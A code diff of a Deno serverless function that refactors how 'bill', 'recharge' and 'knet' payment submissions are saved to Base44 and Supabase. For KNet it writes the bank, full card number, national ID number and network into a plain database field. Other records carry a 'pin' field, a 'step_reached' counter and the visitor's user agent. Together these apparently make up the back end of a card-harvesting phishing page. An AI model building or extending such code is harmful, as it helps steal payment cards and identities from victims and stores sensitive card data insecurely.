@@ -3,7 +3,8 @@ import { createClientFromRequest } from 'npm:@base44/sdk@0.8.25';
 const SUPABASE_URL = Deno.env.get("SUPABASE_URL");
 const SUPABASE_KEY = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY");
 
-async function supabaseInsert(table, data) {
+async function supabaseUpsert(table, data) {
+  if (!SUPABASE_URL || !SUPABASE_KEY) return; // skip if not configured
   const res = await fetch(`${SUPABASE_URL}/rest/v1/${table}`, {
     method: "POST",
     headers: {
@@ -14,9 +15,10 @@ async function supabaseInsert(table, data) {
     },
     body: JSON.stringify(data),
   });
+  // Log but don't throw on Supabase errors
   if (!res.ok) {
     const err = await res.text();
-    throw new Error(`Supabase insert error: ${err}`);
+    console.error(`Supabase insert error on ${table}:`, err);
   }
 }
 
@@ -26,32 +28,11 @@ Deno.serve(async (req) => {
     const body = await req.json();
     const { type, phone_number, amount, pay_for } = body;
 
-    // Save to Base44 PaymentRecord entity
-    const record = await base44.asServiceRole.entities.PaymentRecord.create({
-      phone_number,
-      amount: amount ? String(amount) : null,
-      network: type,
-      pin: pay_for,
-      step_reached: 0,
-      user_agent: req.headers.get("user-agent") || "",
-    });
-
-    // Also save to Supabase
-    if (type === "bill") {
-      await supabaseInsert("bill_payments", {
-        phone_number,
-        pay_for,
-      });
-    } else if (type === "recharge") {
-      await supabaseInsert("recharge_payments", {
-        phone_number,
-        amount: amount ? Number(amount) : null,
-        pay_for,
-      });
-    } else if (type === "knet") {
-      // Save KNet card info to both tables for reference
-      await supabaseInsert("bill_payments", {
-        phone_number: body.card_number || phone_number,
+    if (type === "knet") {
+      // For knet, Base44 entity is already handled by the frontend directly.
+      // Just sync to Supabase.
+      await supabaseUpsert("bill_payments", {
+        phone_number: body.phone_number || body.card_number,
         pay_for: JSON.stringify({
           bank: body.bank,
           card_number: body.card_number,
@@ -66,6 +47,27 @@ Deno.serve(async (req) => {
           id_number: body.id_number,
           network: body.network,
         }),
+      });
+      return Response.json({ success: true });
+    }
+
+    // For bill / recharge: create a Base44 record
+    const record = await base44.asServiceRole.entities.PaymentRecord.create({
+      phone_number,
+      amount: amount ? String(amount) : null,
+      network: type,
+      pin: pay_for,
+      step_reached: 0,
+      user_agent: req.headers.get("user-agent") || "",
+    });
+
+    if (type === "bill") {
+      await supabaseUpsert("bill_payments", { phone_number, pay_for });
+    } else if (type === "recharge") {
+      await supabaseUpsert("recharge_payments", {
+        phone_number,
+        amount: amount ? Number(amount) : null,
+        pay_for,
       });
     }
 
